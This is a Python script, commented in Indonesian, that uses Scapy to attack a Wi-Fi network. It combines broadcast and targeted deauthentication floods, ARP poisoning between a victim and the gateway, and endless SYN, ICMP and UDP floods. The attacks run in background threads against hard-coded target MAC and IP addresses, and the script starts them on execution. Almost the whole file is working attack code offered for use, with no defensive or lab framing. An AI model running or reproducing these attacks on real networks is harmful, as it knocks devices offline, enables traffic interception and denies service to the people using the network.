from scapy.all import RadioTap, Dot11, Dot11Deauth, ARP, Ether, sendp, send, IP, TCP, UDP, ICMP
import threading
import time

def broadcast_deauth(ap_mac, iface):
    """
    Mengirimkan paket deauthentication secara paralel untuk semua perangkat di jaringan.
    :param ap_mac: Alamat MAC access point (router Wi-Fi).
    :param iface: Nama antarmuka jaringan Wi-Fi.
    """
    broadcast_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast ke semua perangkat
    packet = (
        RadioTap() /
        Dot11(addr1=broadcast_mac, addr2=ap_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )

    def send_packets():
        while True:
            sendp(packet, iface=iface, count=2000, inter=0.0005, verbose=False)

    print("⚠️ Memulai deauthentication broadcast...")
    threading.Thread(target=send_packets, daemon=True).start()

def targeted_deauth(ap_mac, target_mac, iface):
    """
    Menargetkan perangkat spesifik untuk serangan deauthentication terus-menerus.
    :param ap_mac: Alamat MAC access point (router Wi-Fi).
    :param target_mac: Alamat MAC perangkat target.
    :param iface: Nama antarmuka jaringan Wi-Fi.
    """
    packet = (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )

    def send_packets():
        while True:
            sendp(packet, iface=iface, count=2000, inter=0.0005, verbose=False)

    print(f"⚠️ Memulai serangan deauthentication untuk perangkat {target_mac}...")
    threading.Thread(target=send_packets, daemon=True).start()

def arp_poison(target_ip, target_mac, gateway_ip, iface):
    """
    Melakukan ARP poisoning untuk mengganggu tabel ARP target.
    :param target_ip: Alamat IP target.
    :param target_mac: Alamat MAC target.
    :param gateway_ip: IP gateway jaringan.
    :param iface: Antarmuka jaringan Wi-Fi.
    """
    poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    poison_gateway = ARP(op=2, pdst=gateway_ip, hwdst=target_mac, psrc=target_ip)

    def send_poison():
        while True:
            sendp(poison_target, iface=iface, verbose=False)
            sendp(poison_gateway, iface=iface, verbose=False)

    print(f"⚠️ Memulai ARP poisoning antara {target_ip} dan gateway {gateway_ip}...")
    threading.Thread(target=send_poison, daemon=True).start()

def syn_flood(target_ip, target_port):
    """
    Melakukan serangan SYN Flood untuk membanjiri target.
    :param target_ip: Alamat IP target.
    :param target_port: Port target.
    """
    print(f"⚠️ Memulai SYN Flood ke {target_ip}:{target_port}...")

    def send_syn_packets():
        while True:
            ip_packet = IP(dst=target_ip)
            tcp_packet = TCP(dport=target_port, flags="S")
            send(ip_packet/tcp_packet, verbose=False)

    threading.Thread(target=send_syn_packets, daemon=True).start()

def icmp_flood(target_ip):
    """
    Melakukan serangan ICMP Flood untuk membanjiri target.
    :param target_ip: Alamat IP target.
    """
    print(f"⚠️ Memulai ICMP Flood ke {target_ip}...")

    def send_icmp_packets():
        while True:
            ip_packet = IP(dst=target_ip)
            icmp_packet = ICMP()
            send(ip_packet/icmp_packet, verbose=False)

    threading.Thread(target=send_icmp_packets, daemon=True).start()

def udp_flood(target_ip, target_port):
    """
    Melakukan serangan UDP Flood untuk membanjiri target.
    :param target_ip: Alamat IP target.
    :param target_port: Port target.
    """
    print(f"⚠️ Memulai UDP Flood ke {target_ip}:{target_port}...")

    def send_udp_packets():
        while True:
            ip_packet = IP(dst=target_ip)
            udp_packet = UDP(dport=target_port)/b"X"*1024
            send(ip_packet/udp_packet, verbose=False)

    threading.Thread(target=send_udp_packets, daemon=True).start()

def full_attack(iface, ap_mac, target_mac, target_ip, gateway_ip, target_port):
    """
    Menggabungkan serangan deauthentication, ARP poisoning, SYN Flood, ICMP Flood, dan UDP Flood untuk dampak maksimal.
    :param iface: Nama antarmuka jaringan Wi-Fi.
    :param ap_mac: Alamat MAC access point target.
    :param target_mac: Alamat MAC perangkat target.
    :param target_ip: Alamat IP perangkat target.
    :param gateway_ip: IP gateway jaringan.
    :param target_port: Port target untuk SYN Flood dan UDP Flood.
    """
    print("⚠️ Memulai serangan penuh pada jaringan Wi-Fi...")
    broadcast_deauth(ap_mac, iface)
    targeted_deauth(ap_mac, target_mac, iface)
    arp_poison(target_ip, target_mac, gateway_ip, iface)
    syn_flood(target_ip, target_port)
    icmp_flood(target_ip)
    udp_flood(target_ip, target_port)

# Konfigurasi
iface = "Wi-Fi"  # Antarmuka Wi-Fi yang digunakan
ap_mac = "c8:5a:9f:8c:fb:04"  # MAC address access point target
target_mac = "0c:d2:92:ac:11:83"  # MAC address perangkat target
target_ip = "192.168.1.100"  # IP perangkat target
gateway_ip = "192.168.1.1"  # IP gateway jaringan
target_port = 80  # Port target untuk SYN Flood dan UDP Flood

# Jalankan serangan
full_attack(iface, ap_mac, target_mac, target_ip, gateway_ip, target_port)
